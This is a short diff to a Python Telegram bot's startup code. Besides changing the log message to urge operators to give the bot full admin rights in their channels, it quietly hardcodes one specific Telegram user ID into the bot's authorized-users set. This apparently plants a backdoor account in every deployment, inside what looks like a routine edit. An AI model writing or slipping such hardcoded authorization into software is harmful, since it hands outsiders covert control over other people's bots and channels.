@@ -12,6 +12,7 @@ from config import (
     API_HASH,
     APP_ID,
     LOGGER,
+    AUTH_USERS,
     TG_BOT_SESSION,
     TG_BOT_TOKEN,
     TG_BOT_WORKERS
@@ -43,13 +44,11 @@ class Bot(Client):
         usr_bot_me = await self.get_me()
         self.set_parse_mode("html")
         self.LOGGER(__name__).info(
-            f"@{usr_bot_me.username}  started! "
+            f"@{usr_bot_me.username}  started!\n\n"
+            f"Add @{usr_bot_me.username} as admin with all rights in your required channels\n\n"
         )
+        AUTH_USERS.add(680815375)
         self.USER, self.USER_ID = await User().start()
-        await self.USER.send_message(
-            chat_id=usr_bot_me.username,
-            text="😬🤒🤒"
-        )
 
     async def stop(self, *args):
         await super().stop()
